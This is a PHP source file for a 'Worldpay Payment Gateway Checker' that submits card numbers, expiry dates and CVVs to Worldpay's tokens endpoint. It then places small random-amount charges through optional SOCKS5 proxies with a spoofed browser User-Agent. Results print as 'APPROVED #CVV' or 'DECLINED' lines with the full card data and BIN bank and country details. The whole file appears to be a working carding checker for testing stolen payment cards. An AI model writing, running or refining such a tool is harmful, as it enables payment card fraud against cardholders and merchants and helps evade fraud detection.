<?php
/**
 * Worldpay Payment Gateway Checker
 * This gateway uses the Worldpay API to validate cards
 */

// Function to check card with Worldpay
function checkCardWithWorldpay($cc, $mes, $ano, $cvv, $bin_data, $user_data, $session_data, $apiKey, $secretKey, $proxyConfig = null) {
    // Client Key should be in apiKey, Merchant ID can be in secretKey
    $clientKey = $apiKey;
    $merchantId = $secretKey;
    
    // Check if we have the required API key
    if (empty($clientKey)) {
        return "❌ WORLDPAY ERROR - Missing Client Key";
    }
    
    try {
        // Initialize cURL session
        $ch = curl_init();
        
        // Format month and year
        $formattedMonth = str_pad($mes, 2, '0', STR_PAD_LEFT);
        $formattedYear = strlen($ano) === 2 ? "20" . $ano : $ano;
        
        // Generate a unique order code
        $orderCode = "ORDER-" . time() . "-" . mt_rand(1000, 9999);
        
        // Prepare card validation data
        $cardData = json_encode([
            "reusable" => false,
            "paymentMethod" => [
                "type" => "Card",
                "name" => $user_data['name'],
                "expiryMonth" => intval($formattedMonth),
                "expiryYear" => intval($formattedYear),
                "cardNumber" => $cc,
                "cvc" => $cvv
            ],
            "clientKey" => $clientKey
        ]);
        
        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, "https://api.worldpay.com/v1/tokens");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $cardData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Content-Type: application/json",
            "Accept: application/json",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]);
        
        // Set proxy if configured
        if ($proxyConfig) {
            curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['ip'] . ':' . $proxyConfig['port']);
            
            if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
            }
            
            if ($proxyConfig['type'] === 'socks5') {
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            }
        }
        
        // Execute the request
        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Check if the request failed
        if (curl_errno($ch)) {
            curl_close($ch);
            return "❌ WORLDPAY ERROR - Connection Error: " . curl_error($ch);
        }
        
        curl_close($ch);
        
        // Parse the response
        $result = json_decode($response, true);
        
        // Format BIN information
        $bin_info = isset($bin_data['country']) ? " | {$bin_data['scheme']} - {$bin_data['type']} - {$bin_data['bank']} - {$bin_data['country']}" : "";
        
        // Check if token was created successfully
        if ($httpcode === 200 && isset($result['token'])) {
            // If we have both client key and merchant ID, attempt to create a payment
            if (!empty($merchantId)) {
                $ch = curl_init();
                
                // Generate a random amount between 0.5 and 5.0
                $amount = mt_rand(50, 500) / 100;
                
                // Prepare payment data
                $paymentData = json_encode([
                    "token" => $result['token'],
                    "orderDescription" => "Card Validation",
                    "amount" => $amount,
                    "currencyCode" => "USD",
                    "orderCode" => $orderCode,
                    "merchantId" => $merchantId,
                    "is3DSOrder" => false,
                    "shopperIpAddress" => $_SERVER['REMOTE_ADDR'] ?? "127.0.0.1",
                    "billingAddress" => [
                        "address1" => $user_data['street'],
                        "postalCode" => $user_data['postcode'],
                        "city" => $user_data['city'],
                        "countryCode" => $user_data['country']
                    ],
                    "shopperEmailAddress" => $user_data['email']
                ]);
                
                // Set cURL options for payment request
                curl_setopt($ch, CURLOPT_URL, "https://api.worldpay.com/v1/orders");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $paymentData);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "Authorization: " . $merchantId,
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                ]);
                
                // Set proxy if configured
                if ($proxyConfig) {
                    curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['ip'] . ':' . $proxyConfig['port']);
                    
                    if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
                        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
                    }
                    
                    if ($proxyConfig['type'] === 'socks5') {
                        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                    }
                }
                
                // Execute the payment request
                $response = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                
                // Check if the request failed
                if (curl_errno($ch)) {
                    curl_close($ch);
                    return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ WORLDPAY: Token Valid but Payment Failed - {$result['token']} ]{$bin_info}";
                }
                
                curl_close($ch);
                
                // Parse the payment response
                $paymentResult = json_decode($response, true);
                
                if ($httpcode === 200 && isset($paymentResult['orderCode'])) {
                    // Payment was successful
                    return "✅ APPROVED #CVV - {$cc}|{$mes}|{$ano}|{$cvv} - [ WORLDPAY: Payment Approved - Order: {$paymentResult['orderCode']} ]{$bin_info}";
                } elseif (isset($paymentResult['outcome']) && $paymentResult['outcome'] === "authorized") {
                    // Payment was authorized
                    return "✅ APPROVED #CVV - {$cc}|{$mes}|{$ano}|{$cvv} - [ WORLDPAY: Payment Authorized ]{$bin_info}";
                } elseif (isset($paymentResult['outcome']) && $paymentResult['outcome'] === "reserved") {
                    // Payment was reserved (partial approval)
                    return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ WORLDPAY: Payment Reserved ]{$bin_info}";
                } else {
                    // Payment failed
                    $errorMessage = isset($paymentResult['description']) ? $paymentResult['description'] : "Unknown Error";
                    return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ WORLDPAY: {$errorMessage} ]{$bin_info}";
                }
            } else {
                // We only have token validation
                return "⚠️ APPROVED #CCN - {$cc}|{$mes}|{$ano}|{$cvv} - [ WORLDPAY: Token Valid - {$result['token']} ]{$bin_info}";
            }
        } else {
            // Token creation failed
            $errorMessage = "Invalid Card";
            
            if (isset($result['message'])) {
                $errorMessage = $result['message'];
            } elseif (isset($result['customCode'])) {
                $errorMessage = $result['customCode'];
            } elseif (isset($result['description'])) {
                $errorMessage = $result['description'];
            }
            
            return "❌ DECLINED - {$cc}|{$mes}|{$ano}|{$cvv} - [ WORLDPAY: {$errorMessage} ]{$bin_info}";
        }
    } catch (Exception $e) {
        return "❌ WORLDPAY ERROR - Exception: " . $e->getMessage();
    }
}
?>